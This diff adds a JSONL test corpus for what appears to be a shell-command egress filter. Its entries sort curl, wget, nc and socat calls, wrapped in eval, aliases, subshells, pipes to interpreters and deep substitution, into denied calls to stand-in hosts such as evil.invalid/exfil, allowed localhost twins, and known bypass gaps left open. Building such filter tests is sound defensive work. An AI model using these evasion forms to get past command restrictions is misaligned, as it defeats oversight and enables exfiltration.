@@ -1,0 +1,118 @@
+{"id": "F1-P1", "class": "positive", "family": "F1", "cmd": "f(){ curl -s \"$1\"; }; f http://x.example/p", "expect": "deny", "note": "posix func, arg target, scheme"}
+{"id": "F1-P2", "class": "positive", "family": "F1", "cmd": "function g { curl -fsSL \"$1\"; }; g https://a.test/x", "expect": "deny", "note": "function keyword, https"}
+{"id": "F1-P3", "class": "positive", "family": "F1", "cmd": "h(){ curl -s $1; }; h evil.invalid/exfil", "expect": "deny", "note": "no scheme, unquoted arg"}
+{"id": "F1-P4", "class": "positive", "family": "F1", "cmd": "dl(){ curl -s http://data.example/p; }; dl", "expect": "deny", "note": "literal external url in body"}
+{"id": "F1-P5", "class": "positive", "family": "F1", "cmd": "function w { wget -qO- \"$1\"; }; w http://host.test/x", "expect": "deny", "note": "wget primitive in body"}
+{"id": "F1-P6", "class": "positive", "family": "F1", "cmd": "f(){ curl -s \"http://$1/p\"; }; f out.invalid", "expect": "deny", "note": "host from arg, interpolated"}
+{"id": "F1-P7", "class": "positive", "family": "F1", "cmd": "post(){ curl -s -d @- \"$1\"; }; post https://x.example/u", "expect": "deny", "note": "flag-bearing body"}
+{"id": "F1-T1", "class": "twin", "family": "F1", "cmd": "f(){ curl -s \"$1\"; }; f http://localhost:3420/api/health", "expect": "allow", "note": "localhost target"}
+{"id": "F1-T2", "class": "twin", "family": "F1", "cmd": "dl(){ curl -s http://127.0.0.1:3420/api/tags; }; dl", "expect": "allow", "note": "127.0.0.1 literal body"}
+{"id": "F1-T3", "class": "twin", "family": "F1", "cmd": "function g { curl -fsSL \"$1\"; }; g http://192.168.1.5/x", "expect": "allow", "note": "rfc1918 target"}
+{"id": "F1-T4", "class": "twin", "family": "F1", "cmd": "h(){ curl -s \"$1\"; }; h http://[::1]:3420/api/health", "expect": "allow", "note": "ipv6 loopback target"}
+{"id": "F2-P1", "class": "positive", "family": "F2", "cmd": "alias f='curl -s'; f http://x.example/p", "expect": "deny", "note": "alias value = tool, scheme"}
+{"id": "F2-P2", "class": "positive", "family": "F2", "cmd": "alias dl=\"curl -fsSL\"; dl https://a.test/x", "expect": "deny", "note": "double-quoted alias value"}
+{"id": "F2-P3", "class": "positive", "family": "F2", "cmd": "alias get='curl -s http://data.example/p'; get", "expect": "deny", "note": "whole url in alias value"}
+{"id": "F2-P4", "class": "positive", "family": "F2", "cmd": "alias w='wget -qO-'; w http://host.test/x", "expect": "deny", "note": "wget alias"}
+{"id": "F2-P5", "class": "positive", "family": "F2", "cmd": "alias f='curl -s'; f evil.invalid/exfil", "expect": "deny", "note": "no scheme call"}
+{"id": "F2-P6", "class": "positive", "family": "F2", "cmd": "shopt -s expand_aliases; alias f='curl -s'; f http://out.invalid/x", "expect": "deny", "note": "expand_aliases prefix"}
+{"id": "F2-T1", "class": "twin", "family": "F2", "cmd": "alias f='curl -s'; f http://localhost:3420/api/health", "expect": "allow", "note": "localhost target"}
+{"id": "F2-T2", "class": "twin", "family": "F2", "cmd": "alias get='curl -s http://127.0.0.1:3420/api/tags'; get", "expect": "allow", "note": "127.0.0.1 in alias value"}
+{"id": "F2-T3", "class": "twin", "family": "F2", "cmd": "alias w='wget -qO-'; w http://192.168.1.5/x", "expect": "allow", "note": "rfc1918 target"}
+{"id": "F3-P1", "class": "positive", "family": "F3", "cmd": "eval 'curl -s http://x.example/p'", "expect": "deny", "note": "single-quoted eval string"}
+{"id": "F3-P2", "class": "positive", "family": "F3", "cmd": "eval \"curl -fsSL https://a.test/x\"", "expect": "deny", "note": "double-quoted eval string"}
+{"id": "F3-P3", "class": "positive", "family": "F3", "cmd": "eval curl -s http://data.example/p", "expect": "deny", "note": "unquoted eval args"}
+{"id": "F3-P4", "class": "positive", "family": "F3", "cmd": "C='curl -s http://host.test/p'; eval \"$C\"", "expect": "deny", "note": "eval of same-command var"}
+{"id": "F3-P5", "class": "positive", "family": "F3", "cmd": "eval 'wget -qO- http://evil.invalid/x'", "expect": "deny", "note": "wget in eval string"}
+{"id": "F3-P6", "class": "positive", "family": "F3", "cmd": "eval \"$(printf 'curl -s %s' http://out.invalid/p)\"", "expect": "deny", "note": "eval of a built string"}
+{"id": "F3-T1", "class": "twin", "family": "F3", "cmd": "eval 'curl -s http://localhost:3420/api/health'", "expect": "allow", "note": "localhost target"}
+{"id": "F3-T2", "class": "twin", "family": "F3", "cmd": "eval \"curl -fsSL http://127.0.0.1:3420/api/tags\"", "expect": "allow", "note": "127.0.0.1 target"}
+{"id": "F3-T3", "class": "twin", "family": "F3", "cmd": "eval curl -s http://192.168.1.5/x", "expect": "allow", "note": "rfc1918 unquoted eval"}
+{"id": "F4-P1", "class": "positive", "family": "F4", "cmd": "bash -c 'curl -s http://x.example/p'", "expect": "deny", "note": "bash -c string"}
+{"id": "F4-P2", "class": "positive", "family": "F4", "cmd": "sh -c \"curl -fsSL https://a.test/x\"", "expect": "deny", "note": "sh -c double-quoted"}
+{"id": "F4-P3", "class": "positive", "family": "F4", "cmd": "zsh -c 'curl -s http://data.example/p'", "expect": "deny", "note": "zsh -c string"}
+{"id": "F4-P4", "class": "positive", "family": "F4", "cmd": "dash -c 'wget -qO- http://host.test/x'", "expect": "deny", "note": "dash -c with wget"}
+{"id": "F4-P5", "class": "positive", "family": "F4", "cmd": "ksh -c 'curl -s http://evil.invalid/x'", "expect": "deny", "note": "ksh -c string"}
+{"id": "F4-P6", "class": "positive", "family": "F4", "cmd": "/bin/sh -c 'curl -s http://out.invalid/p'", "expect": "deny", "note": "absolute path interpreter"}
+{"id": "F4-T1", "class": "twin", "family": "F4", "cmd": "bash -c 'curl -s http://localhost:3420/api/health'", "expect": "allow", "note": "localhost target"}
+{"id": "F4-T2", "class": "twin", "family": "F4", "cmd": "sh -c \"curl -fsSL http://127.0.0.1:3420/api/tags\"", "expect": "allow", "note": "127.0.0.1 target"}
+{"id": "F4-T3", "class": "twin", "family": "F4", "cmd": "zsh -c 'curl -s http://192.168.1.5/x'", "expect": "allow", "note": "rfc1918 target"}
+{"id": "F5-P1", "class": "positive", "family": "F5", "cmd": "CMD=curl; $CMD -s http://x.example/p", "expect": "deny", "note": "var command word"}
+{"id": "F5-P2", "class": "positive", "family": "F5", "cmd": "C=curl; \"$C\" -fsSL https://a.test/x", "expect": "deny", "note": "quoted var command word"}
+{"id": "F5-P3", "class": "positive", "family": "F5", "cmd": "x=curl; ${x} -s http://data.example/p", "expect": "deny", "note": "braced var command word"}
+{"id": "F5-P4", "class": "positive", "family": "F5", "cmd": "CMD=wget; $CMD -qO- http://host.test/x", "expect": "deny", "note": "var wget"}
+{"id": "F5-P5", "class": "positive", "family": "F5", "cmd": "b=/usr/bin/curl; $b -s http://evil.invalid/x", "expect": "deny", "note": "var with absolute path"}
+{"id": "F5-P6", "class": "positive", "family": "F5", "cmd": "read -r C <<< curl; $C -s http://out.invalid/p", "expect": "deny", "note": "command word from read"}
+{"id": "F5-T1", "class": "twin", "family": "F5", "cmd": "CMD=curl; $CMD -s http://localhost:3420/api/health", "expect": "allow", "note": "localhost target"}
+{"id": "F5-T2", "class": "twin", "family": "F5", "cmd": "C=curl; \"$C\" -fsSL http://127.0.0.1:3420/api/tags", "expect": "allow", "note": "127.0.0.1 target"}
+{"id": "F5-T3", "class": "twin", "family": "F5", "cmd": "x=/usr/bin/curl; ${x} -s http://192.168.1.5/x", "expect": "allow", "note": "rfc1918 target"}
+{"id": "F6-P1", "class": "positive", "family": "F6", "cmd": "echo http://x.example/p | xargs curl -s", "expect": "deny", "note": "xargs from pipe"}
+{"id": "F6-P2", "class": "positive", "family": "F6", "cmd": "xargs -n1 curl -s <<< \"https://a.test/x\"", "expect": "deny", "note": "xargs fed a here-string"}
+{"id": "F6-P3", "class": "positive", "family": "F6", "cmd": "find . -name x -exec curl -s http://data.example/p \\;", "expect": "deny", "note": "find -exec"}
+{"id": "F6-P4", "class": "positive", "family": "F6", "cmd": "printf '%s\\n' http://host.test/x | xargs -I{} curl -s {}", "expect": "deny", "note": "xargs -I placeholder"}
+{"id": "F6-P5", "class": "positive", "family": "F6", "cmd": "parallel curl -s ::: http://evil.invalid/x", "expect": "deny", "note": "gnu parallel"}
+{"id": "F6-P6", "class": "positive", "family": "F6", "cmd": "flock /tmp/l curl -s http://out.invalid/x", "expect": "deny", "note": "flock launcher"}
+{"id": "F6-P7", "class": "positive", "family": "F6", "cmd": "setsid curl -s http://x.example/p", "expect": "deny", "note": "setsid launcher"}
+{"id": "F6-P8", "class": "positive", "family": "F6", "cmd": "find . -execdir wget -q http://a.test/x \\;", "expect": "deny", "note": "find -execdir wget"}
+{"id": "F6-T1", "class": "twin", "family": "F6", "cmd": "echo http://localhost:3420/api/health | xargs curl -s", "expect": "allow", "note": "localhost via xargs"}
+{"id": "F6-T2", "class": "twin", "family": "F6", "cmd": "find . -exec curl -s http://127.0.0.1:3420/x \\;", "expect": "allow", "note": "127.0.0.1 via find"}
+{"id": "F6-T3", "class": "twin", "family": "F6", "cmd": "flock /tmp/l curl -s http://192.168.1.5/x", "expect": "allow", "note": "rfc1918 via flock"}
+{"id": "F6-T4", "class": "twin", "family": "F6", "cmd": "xargs -n1 curl -s <<< \"http://localhost:3420/api/health\"", "expect": "allow", "note": "localhost here-string"}
+{"id": "F7-P1", "class": "positive", "family": "F7", "cmd": "(curl -s http://x.example/p)", "expect": "deny", "note": "subshell, attached paren"}
+{"id": "F7-P2", "class": "positive", "family": "F7", "cmd": "(curl -fsSL https://a.test/x)", "expect": "deny", "note": "subshell, attached paren, https"}
+{"id": "F7-P3", "class": "positive", "family": "F7", "cmd": "(curl -s http://data.example/p | cat)", "expect": "deny", "note": "subshell piped"}
+{"id": "F7-P4", "class": "positive", "family": "F7", "cmd": "!curl -s http://host.test/x", "expect": "deny", "note": "attached bang"}
+{"id": "F7-P5", "class": "positive", "family": "F7", "cmd": "(wget -qO- http://evil.invalid/x)", "expect": "deny", "note": "subshell wget"}
+{"id": "F7-P6", "class": "positive", "family": "F7", "cmd": "(curl -s http://out.invalid/x; true)", "expect": "deny", "note": "subshell with trailing cmd"}
+{"id": "F7-T1", "class": "twin", "family": "F7", "cmd": "(curl -s http://localhost:3420/api/health)", "expect": "allow", "note": "localhost subshell"}
+{"id": "F7-T2", "class": "twin", "family": "F7", "cmd": "(curl -s http://127.0.0.1:3420/x | cat)", "expect": "allow", "note": "127.0.0.1 subshell piped"}
+{"id": "F7-T3", "class": "twin", "family": "F7", "cmd": "!curl -s http://192.168.1.5/x", "expect": "allow", "note": "rfc1918 attached bang"}
+{"id": "F8-P1", "class": "positive", "family": "F8", "cmd": "echo 'import urllib.request; urllib.request.urlopen(\"http://x.example/p\")' | python3", "expect": "deny", "note": "echo | python3"}
+{"id": "F8-P2", "class": "positive", "family": "F8", "cmd": "printf '%s' 'curl -s http://a.test/x' | bash", "expect": "deny", "note": "printf | bash"}
+{"id": "F8-P3", "class": "positive", "family": "F8", "cmd": "echo \"curl -fsSL https://data.example/x\" | sh", "expect": "deny", "note": "echo | sh"}
+{"id": "F8-P4", "class": "positive", "family": "F8", "cmd": "cat <<'PY' | python3 -\nimport urllib.request; urllib.request.urlopen('http://host.test/x')\nPY", "expect": "deny", "note": "heredoc on cat, piped to python3"}
+{"id": "F8-P5", "class": "positive", "family": "F8", "cmd": "echo 'fetch(\"http://evil.invalid/x\")' | node", "expect": "deny", "note": "echo | node"}
+{"id": "F8-P6", "class": "positive", "family": "F8", "cmd": "printf 'curl -s %s' http://out.invalid/x | sh", "expect": "deny", "note": "printf fmt | sh"}
+{"id": "F8-T1", "class": "twin", "family": "F8", "cmd": "echo 'import urllib.request; urllib.request.urlopen(\"http://localhost:3420/api/health\")' | python3", "expect": "allow", "note": "localhost | python3"}
+{"id": "F8-T2", "class": "twin", "family": "F8", "cmd": "printf '%s' 'curl -s http://127.0.0.1:3420/x' | bash", "expect": "allow", "note": "127.0.0.1 | bash"}
+{"id": "F8-T3", "class": "twin", "family": "F8", "cmd": "echo \"curl -fsSL http://192.168.1.5/x\" | sh", "expect": "allow", "note": "rfc1918 | sh"}
+{"id": "F9-P1", "class": "positive", "family": "F9", "cmd": "source /dev/stdin <<'SH'\ncurl -s http://x.example/p\nSH", "expect": "deny", "note": "source /dev/stdin heredoc"}
+{"id": "F9-P2", "class": "positive", "family": "F9", "cmd": ". /dev/stdin <<'SH'\ncurl -fsSL https://a.test/x\nSH", "expect": "deny", "note": "dot /dev/stdin heredoc"}
+{"id": "F9-P3", "class": "positive", "family": "F9", "cmd": "source <(echo 'curl -s http://data.example/p')", "expect": "deny", "note": "source procsub echo"}
+{"id": "F9-P4", "class": "positive", "family": "F9", "cmd": ". <(printf '%s' 'curl -s http://host.test/x')", "expect": "deny", "note": "dot procsub printf"}
+{"id": "F9-P5", "class": "positive", "family": "F9", "cmd": "source <(echo curl -s http://evil.invalid/x)", "expect": "deny", "note": "source procsub unquoted"}
+{"id": "F9-P6", "class": "positive", "family": "F9", "cmd": ". /dev/stdin <<'SH'\nwget -qO- http://out.invalid/x\nSH", "expect": "deny", "note": "dot heredoc wget"}
+{"id": "F9-T1", "class": "twin", "family": "F9", "cmd": "source /dev/stdin <<'SH'\ncurl -s http://localhost:3420/api/health\nSH", "expect": "allow", "note": "localhost heredoc"}
+{"id": "F9-T2", "class": "twin", "family": "F9", "cmd": ". <(echo 'curl -s http://127.0.0.1:3420/x')", "expect": "allow", "note": "127.0.0.1 procsub"}
+{"id": "F9-T3", "class": "twin", "family": "F9", "cmd": "source <(echo curl -s http://192.168.1.5/x)", "expect": "allow", "note": "rfc1918 procsub"}
+{"id": "F10-P1", "class": "positive", "family": "F10", "cmd": "curl -s http://x.example/p 'unterminated", "expect": "deny", "note": "unterminated single quote"}
+{"id": "F10-P2", "class": "positive", "family": "F10", "cmd": "eval \"curl -s http://a.test/x", "expect": "deny", "note": "unterminated double quote"}
+{"id": "F10-P3", "class": "positive", "family": "F10", "cmd": "python3 <<'PY'\nimport urllib.request; urllib.request.urlopen('http://data.example/x')", "expect": "deny", "note": "unterminated heredoc, python primitive"}
+{"id": "F10-P4", "class": "positive", "family": "F10", "cmd": "nc host.test 80 <<'E'\nGET /", "expect": "deny", "note": "unterminated heredoc, nc primitive"}
+{"id": "F10-P5", "class": "positive", "family": "F10", "cmd": "curl -s http://evil.invalid/x \"", "expect": "deny", "note": "trailing unterminated quote"}
+{"id": "F10-P6", "class": "positive", "family": "F10", "cmd": "socat - TCP:out.invalid:80 <<'E'\nx", "expect": "deny", "note": "unterminated heredoc, socat primitive"}
+{"id": "F10-T1", "class": "twin", "family": "F10", "cmd": "curl -s http://localhost:3420/api/health 'unterminated", "expect": "allow", "note": "unparseable but localhost target"}
+{"id": "F10-T2", "class": "twin", "family": "F10", "cmd": "python3 <<'PY'\nimport urllib.request; urllib.request.urlopen('http://127.0.0.1:3420/x')", "expect": "allow", "note": "unparseable, 127.0.0.1 target"}
+{"id": "F10-T3", "class": "twin", "family": "F10", "cmd": "curl -s http://192.168.1.5/x \"", "expect": "allow", "note": "unparseable, rfc1918 target"}
+{"id": "F11-P1", "class": "positive", "family": "F11", "cmd": "$($($($($(curl -s http://x.example/p)))))", "expect": "deny", "note": "5-deep command substitution"}
+{"id": "F11-P2", "class": "positive", "family": "F11", "cmd": "$($($($($($(curl -fsSL https://a.test/x))))))", "expect": "deny", "note": "6-deep command substitution"}
+{"id": "F11-P3", "class": "positive", "family": "F11", "cmd": "((((curl -s http://data.example/x))))", "expect": "deny", "note": "4-deep attached parens"}
+{"id": "F11-P4", "class": "positive", "family": "F11", "cmd": "$( $( $( $( eval 'curl -s http://host.test/x' ) ) ) )", "expect": "deny", "note": "deep subst wrapping eval"}
+{"id": "F11-P5", "class": "positive", "family": "F11", "cmd": "$($($($($(wget -qO- http://evil.invalid/x)))))", "expect": "deny", "note": "5-deep subst, wget"}
+{"id": "F11-P6", "class": "positive", "family": "F11", "cmd": "$($($($($(bash -c 'curl -s http://out.invalid/x')))))", "expect": "deny", "note": "deep subst wrapping bash -c"}
+{"id": "F11-T1", "class": "twin", "family": "F11", "cmd": "$($($($($(curl -s http://localhost:3420/api/health)))))", "expect": "allow", "note": "deep subst, localhost"}
+{"id": "F11-T2", "class": "twin", "family": "F11", "cmd": "((((curl -s http://127.0.0.1:3420/x))))", "expect": "allow", "note": "deep parens, 127.0.0.1"}
+{"id": "F11-T3", "class": "twin", "family": "F11", "cmd": "$($($($($(curl -s http://192.168.1.5/x)))))", "expect": "allow", "note": "deep subst, rfc1918"}
+{"id": "O1-O1", "class": "open", "family": "O1", "cmd": "bash ./fetch.sh", "expect": "allow", "note": "marad nyitva: network call inside a script file"}
+{"id": "O1-O2", "class": "open", "family": "O1", "cmd": "python3 fetch.py", "expect": "allow", "note": "marad nyitva: network call inside a script file"}
+{"id": "O1-O3", "class": "open", "family": "O1", "cmd": "sh scripts/run.sh", "expect": "allow", "note": "marad nyitva: network call inside a script file"}
+{"id": "O2-O1", "class": "open", "family": "O2", "cmd": "git clone https://x.example/r.git", "expect": "allow", "note": "marad nyitva: other network-capable binary (git)"}
+{"id": "O2-O2", "class": "open", "family": "O2", "cmd": "wget http://a.test/x", "expect": "allow", "note": "marad nyitva: direct wget, deny-list/owner decision"}
+{"id": "O2-O3", "class": "open", "family": "O2", "cmd": "pip install https://data.example/p.tar.gz", "expect": "allow", "note": "marad nyitva: pip"}
+{"id": "O2-O4", "class": "open", "family": "O2", "cmd": "ssh user@host.test true", "expect": "allow", "note": "marad nyitva: ssh"}
+{"id": "O2-O5", "class": "open", "family": "O2", "cmd": "rsync -a a user@evil.invalid:/b", "expect": "allow", "note": "marad nyitva: rsync"}
+{"id": "O2-O6", "class": "open", "family": "O2", "cmd": "scp f user@out.invalid:/b", "expect": "allow", "note": "marad nyitva: scp"}
+{"id": "O3-O1", "class": "open", "family": "O3", "cmd": "curl -s \"$URL\"", "expect": "allow", "note": "marad nyitva: host from the environment, not literal"}
+{"id": "O3-O2", "class": "open", "family": "O3", "cmd": "H=$(cat host.txt); curl -s \"http://$H/x\"", "expect": "allow", "note": "marad nyitva: host read from a file at runtime"}
+{"id": "O3-O3", "class": "open", "family": "O3", "cmd": "curl $(echo https://x.example)", "expect": "allow", "note": "marad nyitva: host computed by a substitution"}
+{"id": "O3-O4", "class": "open", "family": "O3", "cmd": "curl -K curl.cfg", "expect": "allow", "note": "marad nyitva: destination from a curl config file"}
+{"id": "O6-O1", "class": "open", "family": "O6", "cmd": "eval \"$(printf %s Y3VybA==)\" -s http://x.example/p", "expect": "allow", "note": "marad nyitva: full shell interpretation / encoded command word is not a goal"}
